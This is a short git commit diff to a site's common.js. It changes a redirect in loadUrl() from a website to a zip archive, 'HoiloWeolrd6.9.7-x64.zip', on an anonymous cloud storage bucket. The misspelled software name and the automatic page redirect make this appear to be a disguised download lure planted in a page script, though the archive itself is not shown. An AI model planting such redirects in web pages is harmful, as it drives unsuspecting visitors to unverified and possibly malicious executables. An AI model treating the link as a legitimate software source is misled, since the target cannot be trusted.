cd8c516a0f0e6937c91673b3241782699d47543a
siwaza <brucelook2025@outlook.com>
2025-06-23 00:27:50 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://www.djbzymm.com";
+		var url="https://gsdhfd.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
 		window.location=url;
 	}
 }
